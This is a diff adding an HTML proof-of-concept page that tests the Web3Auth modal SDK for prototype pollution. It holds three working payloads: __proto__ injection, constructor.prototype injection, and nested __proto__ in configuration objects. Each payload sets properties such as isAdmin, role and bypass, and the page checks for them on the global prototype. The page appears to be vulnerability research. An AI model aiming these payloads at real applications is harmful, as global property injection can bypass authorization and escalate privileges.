@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Web3Auth Prototype Pollution PoC</title>
+  <script src="https://cdn.jsdelivr.net/npm/@web3auth/modal@latest"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 800px;
+      margin: 50px auto;
+      padding: 20px;
+    }
+    .test-section {
+      margin: 20px 0;
+      padding: 15px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+    }
+    button {
+      padding: 10px 20px;
+      margin: 5px;
+      cursor: pointer;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+    }
+    button:hover { background: #0056b3; }
+    #results {
+      background: #f5f5f5;
+      padding: 15px;
+      border-radius: 4px;
+      font-family: monospace;
+      white-space: pre-wrap;
+      margin-top: 20px;
+    }
+    .vulnerable { color: #dc3545; font-weight: bold; }
+    .safe { color: #28a745; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <h1>🔒 Web3Auth Prototype Pollution Security Test</h1>
+  <p><strong>Test Objective:</strong> Verify if deepmerge operations are vulnerable to prototype pollution</p>
+  <p><strong>Severity:</strong> CRITICAL | <strong>CWE:</strong> CWE-1321</p>
+
+  <div class="test-section">
+    <h2>Test Controls</h2>
+    <button id="test-proto-pollution">Test __proto__ Pollution</button>
+    <button id="test-constructor-pollution">Test constructor.prototype</button>
+    <button id="test-nested-pollution">Test Nested Pollution</button>
+    <button id="verify-pollution">Verify Pollution Status</button>
+    <button id="reset-test">Reset Test</button>
+  </div>
+
+  <div class="test-section">
+    <h2>Test Results</h2>
+    <pre id="results">Ready to test. Click a test button to begin.</pre>
+  </div>
+
+  <div class="test-section">
+    <h2>Current Pollution Status</h2>
+    <div id="pollution-status">Not tested yet</div>
+  </div>
+
+  <script>
+    const results = document.getElementById('results');
+    const pollutionStatus = document.getElementById('pollution-status');
+    const CLIENT_ID = 'BFNfeVQyFvB_Fo5Yd6jYOvwje42U8qaHkDLOZ51AF_AjAd8GbrHV-zZ6yVytWDJJwKmJHQn7G7bW6Ei3p5Og8dw';
+
+    let web3auth = null;
+
+    function log(message, isError = false) {
+      const timestamp = new Date().toISOString();
+      results.textContent += `[${timestamp}] ${message}\n`;
+      console.log(message);
+    }
+
+    function updatePollutionStatus() {
+      const testObj = {};
+      const isPolluted = testObj.isPolluted === true ||
+                         testObj.isAdmin === true ||
+                         testObj.role === 'administrator' ||
+                         testObj.compromised === true ||
+                         testObj.bypass === true;
+
+      const statusHtml = isPolluted ?
+        '<span class="vulnerable">🔴 VULNERABLE - Prototype pollution detected!</span>' :
+        '<span class="safe">✅ PROTECTED - No pollution detected</span>';
+
+      pollutionStatus.innerHTML = statusHtml + '<br><br>Details:<pre>' + JSON.stringify({
+        'isPolluted': testObj.isPolluted,
+        'isAdmin': testObj.isAdmin,
+        'role': testObj.role,
+        'compromised': testObj.compromised,
+        'bypass': testObj.bypass
+      }, null, 2) + '</pre>';
+
+      return isPolluted;
+    }
+
+    // Test Case 1: __proto__ injection
+    document.getElementById('test-proto-pollution').addEventListener('click', async () => {
+      log('=== TEST CASE 1: __proto__ Injection ===');
+      log('Attempting to pollute Object.prototype via __proto__...');
+
+      try {
+        const pollutionPayload = {
+          chainConfig: {
+            chainNamespace: "eip155",
+            chainId: "0x1",
+            rpcTarget: "https://rpc.ankr.com/eth"
+          },
+          __proto__: {
+            isPolluted: true,
+            isAdmin: true,
+            role: "administrator"
+          }
+        };
+
+        log('Payload: ' + JSON.stringify(pollutionPayload, null, 2));
+
+        // Initialize Web3Auth with malicious payload
+        web3auth = new window.Modal.Web3Auth({
+          clientId: CLIENT_ID,
+          web3AuthNetwork: "sapphire_mainnet",
+          ...pollutionPayload
+        });
+
+        await web3auth.initModal();
+
+        log('✓ Web3Auth initialized with __proto__ payload');
+
+        // Check pollution immediately
+        const polluted = updatePollutionStatus();
+        if (polluted) {
+          log('🔴 VULNERABILITY CONFIRMED: __proto__ pollution successful', true);
+        } else {
+          log('✅ SAFE: __proto__ pollution blocked');
+        }
+
+      } catch (error) {
+        log(`Error (may be expected): ${error.message}`, true);
+        updatePollutionStatus();
+      }
+    });
+
+    // Test Case 2: constructor.prototype injection
+    document.getElementById('test-constructor-pollution').addEventListener('click', async () => {
+      log('\n=== TEST CASE 2: constructor.prototype Injection ===');
+      log('Attempting to pollute via constructor.prototype...');
+
+      try {
+        const advancedPayload = {
+          chainConfig: {
+            chainNamespace: "eip155",
+            chainId: "0x1"
+          },
+          constructor: {
+            prototype: {
+              compromised: true
+            }
+          }
+        };
+
+        log('Payload: ' + JSON.stringify(advancedPayload, null, 2));
+
+        web3auth = new window.Modal.Web3Auth({
+          clientId: CLIENT_ID,
+          web3AuthNetwork: "sapphire_mainnet",
+          ...advancedPayload
+        });
+
+        await web3auth.initModal();
+
+        log('✓ Web3Auth initialized with constructor payload');
+
+        const polluted = updatePollutionStatus();
+        if (polluted) {
+          log('🔴 VULNERABILITY CONFIRMED: constructor.prototype pollution successful', true);
+        } else {
+          log('✅ SAFE: constructor.prototype pollution blocked');
+        }
+
+      } catch (error) {
+        log(`Error (may be expected): ${error.message}`, true);
+        updatePollutionStatus();
+      }
+    });
+
+    // Test Case 3: Nested pollution
+    document.getElementById('test-nested-pollution').addEventListener('click', async () => {
+      log('\n=== TEST CASE 3: Nested Object Pollution ===');
+      log('Attempting nested pollution via extraLoginOptions...');
+
+      try {
+        const nestedPayload = {
+          chainConfig: {
+            chainNamespace: "eip155",
+            chainId: "0x1",
+            __proto__: {
+              bypass: true
+            }
+          },
+          uiConfig: {
+            __proto__: {
+              compromised: true
+            }
+          }
+        };
+
+        log('Payload: ' + JSON.stringify(nestedPayload, null, 2));
+
+        web3auth = new window.Modal.Web3Auth({
+          clientId: CLIENT_ID,
+          web3AuthNetwork: "sapphire_mainnet",
+          ...nestedPayload
+        });
+
+        await web3auth.initModal();
+
+        log('✓ Web3Auth initialized with nested payload');
+
+        const polluted = updatePollutionStatus();
+        if (polluted) {
+          log('🔴 VULNERABILITY CONFIRMED: Nested pollution successful', true);
+        } else {
+          log('✅ SAFE: Nested pollution blocked');
+        }
+
+      } catch (error) {
+        log(`Error (may be expected): ${error.message}`, true);
+        updatePollutionStatus();
+      }
+    });
+
+    // Verify pollution button
+    document.getElementById('verify-pollution').addEventListener('click', () => {
+      log('\n=== POLLUTION VERIFICATION ===');
+      const polluted = updatePollutionStatus();
+
+      if (polluted) {
+        log('🔴 RESULT: System is vulnerable to prototype pollution', true);
+        log('Impact: Attacker can inject properties into all objects globally');
+      } else {
+        log('✅ RESULT: System appears protected against prototype pollution');
+      }
+    });
+
+    // Reset test
+    document.getElementById('reset-test').addEventListener('click', () => {
+      results.textContent = 'Test reset. Ready to test again.\n';
+      pollutionStatus.innerHTML = 'Not tested yet';
+      if (web3auth) {
+        try {
+          // Clean up
+        } catch (e) {
+          console.log('Cleanup error:', e);
+        }
+      }
+      web3auth = null;
+    });
+
+    // Auto-check pollution status on page load
+    window.addEventListener('load', () => {
+      log('Page loaded. Initial pollution check...');
+      updatePollutionStatus();
+    });
+  </script>
+</body>
+</html>
